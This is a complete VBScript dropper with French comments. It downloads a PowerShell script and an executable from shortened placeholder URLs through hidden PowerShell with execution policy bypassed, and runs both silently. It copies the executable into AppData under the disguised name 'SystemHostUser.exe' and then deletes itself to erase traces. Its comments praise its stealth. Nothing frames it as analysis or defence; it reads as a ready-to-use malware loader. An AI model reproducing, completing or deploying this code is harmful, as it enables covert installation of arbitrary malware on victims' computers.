Option Explicit
On Error Resume Next ' Empêche le script de planter si une erreur survient

' --- 1. CONFIGURATION (Vos liens) ---
Const URL_PS1 = "https://is.gd/votre_lien_ps1"
Const URL_EXE = "https://is.gd/votre_lien_exe"

' --- 2. INITIALISATION ---
Dim WshShell, FSO, TempDir, AppDataDir
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Récupération dynamique des dossiers système (Indépendant de la langue et du nom User)
TempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
AppDataDir = WshShell.ExpandEnvironmentStrings("%APPDATA%")

' Noms internes génériques (peu importe le nom de vos fichiers originaux)
Dim FilePs1, FileExeTemp, FileExeFinal
FilePs1 = TempDir & "\update_config.ps1"
FileExeTemp = TempDir & "\setup_service.exe"
' On place l'EXE final dans AppData (dossier caché par défaut), plus discret et pro
FileExeFinal = AppDataDir & "\SystemHostUser.exe"

' --- 3. FONCTIONS UTILITAIRES ---

' Fonction de téléchargement robuste via PowerShell
Sub DownloadFile(Link, Path)
    ' Supprime le fichier s'il existe déjà pour éviter les erreurs de conflit
    If FSO.FileExists(Path) Then FSO.DeleteFile Path, True
    
    Dim psCmd
    ' -NoProfile : Charge plus vite
    ' -NonInteractive : Pas d'interaction utilisateur
    ' -WindowStyle Hidden : Invisible
    psCmd = "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
            """[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
            "(New-Object Net.WebClient).DownloadFile('" & Link & "', '" & Path & "')"""
            
    WshShell.Run psCmd, 0, True ' Attend la fin du téléchargement
End Sub

' Fonction d'exécution silencieuse
Sub RunSilent(Path)
    If FSO.FileExists(Path) Then
        ' Si c'est un PS1
        If Right(Path, 4) = ".ps1" Then
            WshShell.Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & Path & """", 0, False
        ' Si c'est un EXE
        Else
            WshShell.Run """" & Path & """", 0, False
        End If
    End If
End Sub

' --- 4. EXÉCUTION DE LA LOGIQUE ---

' A. Traitement du PS1
DownloadFile URL_PS1, FilePs1
RunSilent FilePs1

' B. Temporisation (15 secondes précises)
WScript.Sleep 15000

' C. Traitement de l'EXE
DownloadFile URL_EXE, FileExeTemp

If FSO.FileExists(FileExeTemp) Then
    ' Copie vers l'emplacement final (AppData)
    ' On force l'écrasement (True) si le fichier existe déjà
    FSO.CopyFile FileExeTemp, FileExeFinal, True
    
    ' Lancement de l'EXE installé
    RunSilent FileExeFinal
    
    ' Nettoyage immédiat du fichier temporaire
    FSO.DeleteFile FileExeTemp, True
End If

' --- 5. AUTO-DESTRUCTION DU VBS ---
' Supprime ce script VBS peu importe son nom ou son emplacement
Dim MySelf
MySelf = WScript.ScriptFullName
' Commande CMD : Ping 3s (délai pour libérer le fichier) puis suppression
WshShell.Run "cmd /c ping localhost -n 3 > nul & del """ & MySelf & """", 0, False

Set WshShell = Nothing
Set FSO = Nothing